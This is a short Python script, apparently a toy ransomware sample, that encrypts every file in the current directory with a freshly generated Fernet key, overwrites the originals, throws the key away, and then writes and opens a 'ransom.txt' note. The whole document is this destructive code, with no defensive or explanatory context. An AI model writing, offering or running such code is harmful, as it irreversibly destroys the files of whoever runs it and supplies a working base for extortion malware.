from cryptography.fernet import Fernet
import glob
import os

key = Fernet.generate_key()
f = Fernet(key)

txt = glob.glob("*.*")
print(txt)
for p in txt:
    file = open(p,"r")
    content = file.readlines()
    print("opened and read file!")
    file.close()
    content = str(content)
    content = content.encode()
    newcontent = f.encrypt(content)
    newcontent = str(newcontent)
    with open(p,"w+") as w:
        w.writelines(newcontent)
        print("written to file!")
        w.close()
os.system("echo imagine getting your files encrypted>ransom.txt")
os.system("start ransom.txt")



    
